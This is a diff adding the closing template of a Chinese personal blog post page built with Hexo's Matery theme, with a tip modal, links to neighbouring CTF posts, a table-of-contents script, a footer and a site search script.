+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2022/04/13/misc-%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="misc-内存取证(4.11-1.17)">
+                        
+                        <span class="card-title">misc-内存取证(4.11-1.17)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-04-13
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            hz
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/misc/">
+                        <span class="chip bg-color">misc</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/04/01/pop%E9%93%BE%E6%9E%84%E9%80%A0%E5%88%97%E9%A2%98/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="pop链构造列题">
+                        
+                        <span class="card-title">pop链构造列题</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-01
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            hz
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                        <span class="chip bg-color">php反序列化</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">hz</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;Total visitors:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/shianer" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:292595085@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=292595085" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 292595085" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
